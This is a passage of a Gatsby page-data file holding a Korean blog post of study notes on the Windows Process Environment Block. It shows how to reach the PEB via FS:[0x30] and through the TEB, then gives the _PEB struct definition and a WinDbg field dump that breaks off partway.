{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/window_1_theori/",
    "result": {"data":{"cur":{"id":"3c959693-35cd-5fa0-bdb5-e82315df4c6d","html":"<ul>\n<li>window NT 데이터 구조체 이며 프로세스 정보를 담고 있는 구조체</li>\n</ul>\n<h2 id=\"peb-접근-방법\" style=\"position:relative;\"><a href=\"#peb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\" aria-label=\"peb 접근 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB 접근 방법</h2>\n<ul>\n<li>TEB.ProcessEnvironmentBlock 멤버가 PEB 구조체의 주소</li>\n<li>TEB 구조체는 FS 세그먼트 셀렉터가 가리키는 세그먼트 메모리의 base address에 위치한다.</li>\n<li>그리고 ProcessEnvironmentBlock 멤버는 TEB 구조체 시작 부터 30 옵셋만큼 떨어져 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> TEB<span class=\"token punctuation\">.</span>ProcessEnvironmentBlock <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<h2 id=\"method-1\" style=\"position:relative;\"><a href=\"#method-1\" aria-label=\"method 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>method 1</h2>\n<ul>\n<li>바로 PEB 주소를 구하는 방법</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV EAX<span class=\"token punctuation\">,</span> DWORD PTR FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span>      <span class=\"token punctuation\">;</span> FS<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<h2 id=\"method-2\" style=\"position:relative;\"><a href=\"#method-2\" aria-label=\"method 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>method 2</h2>\n<ul>\n<li>TEB 주소를 구한후 ProcessEnvironmentBlock 멤버를 이용</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV EAX<span class=\"token punctuation\">,</span> DWORD PTR FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span>       <span class=\"token punctuation\">;</span> FS<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of TEB\nMOV EAX<span class=\"token punctuation\">,</span> DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span>EAX<span class=\"token operator\">+</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span>   <span class=\"token punctuation\">;</span> DS<span class=\"token punctuation\">[</span>EAX<span class=\"token operator\">+</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABoklEQVQozz3RUW/TMBAH8Hz/j0EHLwjEHsZomQQMqahjaJ0G7douTVIncRyf47MTJ07axqgKVPo93Mtfuvuf51rsKp4n2zKPdgBB+mlfLZ2tnMWjEQfNnMVBbzEJNyzaSEaqItubwsvjUgsIlo+YBCz1k3hSwqqrZFeCxcxK2pUwaEsQaVBlYQnJwYDrlHcwyiBELwtkRFMf6NSqP3sj9kZ0JewrGOYBI9uCBrWkrc6dRc+1qimBxds8WqWMvkRfK/jYVSvXYt/IvpGuxUHf4m67kmzXW3UwxbGWnrOq0ZARP9k8reNgsf7CyEiJy6566ht9Cg8HN/JYSyULhagVKkSF0nOdqkugxIfd2qc7n9zZ4nOtvp0Kq+W/cIuu032rcs4ZB84BhCik9ICGGlKeRgpSCZnIGfJMAVVADfJGi0YLg7xgcVVky/mv+Wy6fv4d+mtKQm/24/tkfD25uZ5cXd2Oxw/3MxYHkJEzweKMBM8P93S7tDS0OTn3793eTF6NLi4+vBm9e/3+8u3dz+lpyfNvT4WpWuWL+ZwnoetN3yr331/SJuwAkbF/mwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/0e108b97323267fb25a1db164ed8e537/37523/0.png\"\n        srcset=\"/static/0e108b97323267fb25a1db164ed8e537/e9ff0/0.png 180w,\n/static/0e108b97323267fb25a1db164ed8e537/f21e7/0.png 360w,\n/static/0e108b97323267fb25a1db164ed8e537/37523/0.png 720w,\n/static/0e108b97323267fb25a1db164ed8e537/302a4/0.png 1080w,\n/static/0e108b97323267fb25a1db164ed8e537/07a9c/0.png 1440w,\n/static/0e108b97323267fb25a1db164ed8e537/3a5d5/0.png 1807w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FS:[0x30] 주소 값을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"peb-구조체-정의\" style=\"position:relative;\"><a href=\"#peb-%EA%B5%AC%EC%A1%B0%EC%B2%B4-%EC%A0%95%EC%9D%98\" aria-label=\"peb 구조체 정의 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB 구조체 정의</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB</span> <span class=\"token punctuation\">{</span>\n  BYTE                          Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  BYTE                          BeingDebugged<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PPEB_LDR_DATA                 Ldr<span class=\"token punctuation\">;</span>\n  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved4<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved5<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved6<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved7<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  ULONG                         SessionId<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> PEB<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PPEB<span class=\"token punctuation\">;</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">ntdll<span class=\"token operator\">!</span>_PEB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> InheritedAddressSpace <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x001</span> ReadImageFileExecOptions <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x002</span> BeingDebugged    <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> BitField         <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> ImageUsesLargePages <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsProtectedProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsImageDynamicallyRelocated <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> SkipPatchingUser32Forwarders <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsPackagedProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsAppContainer   <span class=\"token operator\">:</span> Pos <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsProtectedProcessLight <span class=\"token operator\">:</span> Pos <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsLongPathAwareProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> Padding0         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> Mutant           <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> ImageBaseAddress <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Ldr              <span class=\"token operator\">:</span> Ptr64 _PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x020</span> ProcessParameters <span class=\"token operator\">:</span> Ptr64 _RTL_USER_PROCESS_PARAMETERS\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> SubSystemData    <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessHeap      <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x038</span> FastPebLock      <span class=\"token operator\">:</span> Ptr64 _RTL_CRITICAL_SECTION\n   <span class=\"token operator\">+</span><span class=\"token number\">0x040</span> AtlThunkSListPtr <span class=\"token operator\">:</span> Ptr64 _SLIST_HEADER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x048</span> IFEOKey          <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> CrossProcessFlags <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessInJob     <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessInitializing <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingVEH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingVCH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingFTH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessPreviouslyThrottled <span class=\"token operator\">:</span> Pos <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessCurrentlyThrottled <span class=\"token operator\">:</span> Pos <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessImagesHotPatched <span class=\"token operator\">:</span> Pos <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ReservedBits0    <span class=\"token operator\">:</span> Pos <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x054</span> Padding1         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x058</span> KernelCallbackTable <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x058</span> UserSharedInfoPtr <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x060</span> SystemReserved   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x064</span> AtlThunkSListPtr32 <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x068</span> ApiSetMap        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x070</span> TlsExpansionCounter <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x074</span> Padding2         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x078</span> TlsBitmap        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x080</span> TlsBitmapBits    <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x088</span> ReadOnlySharedMemoryBase <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x090</span> SharedData       <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x098</span> ReadOnlyStaticServerData <span class=\"token operator\">:</span> Ptr64 Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0a0</span> AnsiCodePageData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0a8</span> OemCodePageData  <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0b0</span> UnicodeCaseTableData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0b8</span> NumberOfProcessors <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0bc</span> NtGlobalFlag     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c0</span> CriticalSectionTimeout <span class=\"token operator\">:</span> _LARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c8</span> HeapSegmentReserve <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0d0</span> HeapSegmentCommit <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0d8</span> HeapDeCommitTotalFreeThreshold <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0e0</span> HeapDeCommitFreeBlockThreshold <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0e8</span> NumberOfHeaps    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0ec</span> MaximumNumberOfHeaps <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0f0</span> ProcessHeaps     <span class=\"token operator\">:</span> Ptr64 Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0f8</span> GdiSharedHandleTable <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x100</span> ProcessStarterHelper <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x108</span> GdiDCAttributeList <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x10c</span> Padding3         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x110</span> LoaderLock       <span class=\"token operator\">:</span> Ptr64 _RTL_CRITICAL_SECTION\n   <span class=\"token operator\">+</span><span class=\"token number\">0x118</span> OSMajorVersion   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x11c</span> OSMinorVersion   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x120</span> OSBuildNumber    <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x122</span> OSCSDVersion     <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x124</span> OSPlatformId     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x128</span> ImageSubsystem   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x12c</span> ImageSubsystemMajorVersion <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x130</span> ImageSubsystemMinorVersion <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x134</span> Padding4         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x138</span> ActiveProcessAffinityMask <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x140</span> GdiHandleBuffer  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">60</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x230</span> PostProcessInitRoutine <span class=\"token operator\">:</span> Ptr64     <span class=\"token keyword\">void</span> \n   <span class=\"token operator\">+</span><span class=\"token number\">0x238</span> TlsExpansionBitmap <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x240</span> TlsExpansionBitmapBits <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c0</span> SessionId        <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c4</span> Padding5         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c8</span> AppCompatFlags   <span class=\"token operator\">:</span> _ULARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2d0</span> AppCompatFlagsUser <span class=\"token operator\">:</span> _ULARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2d8</span> pShimData        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2e0</span> AppCompatInfo    <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2e8</span> CSDVersion       <span class=\"token operator\">:</span> _UNICODE_STRING\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2f8</span> ActivationContextData <span class=\"token operator\">:</span> Ptr64 _ACTIVATION_CONTEXT_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x300</span> ProcessAssemblyStorageMap <span class=\"token operator\">:</span> Ptr64 _ASSEMBLY_STORAGE_MAP\n   <span class=\"token operator\">+</span><span class=\"token number\">0x308</span> SystemDefaultActivationContextData <span class=\"token operator\">:</span> Ptr64 _ACTIVATION_CONTEXT_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x310</span> SystemAssemblyStorageMap <span class=\"token operator\">:</span> Ptr64 _ASSEMBLY_STORAGE_MAP\n   <span class=\"token operator\">+</span><span class=\"token number\">0x318</span> MinimumStackCommit <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x320</span> SparePointers    <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x340</span> SpareUlongs      <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x358</span> WerRegistrationData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x360</span> WerShipAssertPtr <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x368</span> pUnused          <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x370</span> pImageHeaderHash <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> TracingFlags     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> HeapTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> CritSecTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> LibLoaderTracingEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x378</span> SpareTracingBits <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x37c</span> Padding6         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x380</span> CsrServerReadOnlySharedMemoryBase <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x388</span> TppWorkerpListLock <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x390</span> TppWorkerpList   <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0x3a0</span> WaitOnAddressHashTable <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7a0</span> TelemetryCoverageHeader <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7a8</span> CloudFileFlags   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7ac</span> CloudFileDiagFlags <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b0</span> PlaceholderCompatibilityMode <span class=\"token operator\">:</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b1</span> PlaceholderCompatibilityModeReserved <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7b8</span> LeapSecondData   <span class=\"token operator\">:</span> Ptr64 _LEAP_SECOND_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> LeapSecondFlags  <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> SixtySecondEnabled <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c0</span> Reserved         <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c4</span> NtGlobalFlag2    <span class=\"token operator\">:</span> Uint4B</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">tdll<span class=\"token operator\">!</span>_PEB \n   <span class=\"token operator\">+</span><span class=\"token number\">0x002</span> BeingDebugged    <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> ImageBaseAddress <span class=\"token operator\">:</span> Ptr64 